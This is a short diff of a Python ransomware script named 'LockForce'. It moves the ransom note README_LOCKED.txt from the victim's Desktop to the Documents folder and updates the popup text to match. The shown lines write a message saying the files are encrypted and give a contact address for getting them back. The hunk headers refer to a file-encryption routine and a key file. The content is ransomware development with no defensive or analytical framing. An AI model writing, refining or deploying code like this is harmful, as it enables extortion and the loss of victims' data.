@@ -36,8 +36,8 @@ def encrypt_files(key):
 
 # Create ransom note
 def create_ransom_note():
-    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-    note_path = os.path.join(desktop, "README_LOCKED.txt")
+    doc = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
+    note_path = os.path.join(doc, "README_LOCKED.txt")
     with open(note_path, "w") as f:
         f.write("Your important files have been encrypted by LockForce.\n")
         f.write("To get them back, contact: lockforce@hacker.com\n")
@@ -47,7 +47,7 @@ def create_ransom_note():
 def popup():
     root = tk.Tk()
     root.withdraw()
-    messagebox.showerror("LOCKFORCE ALERT", "Your files are encrypted! Check your Desktop!")
+    messagebox.showerror("LOCKFORCE ALERT", "Your files are encrypted! Check your Documents!")
 
 def main():
     if not os.path.exists("key.key"):
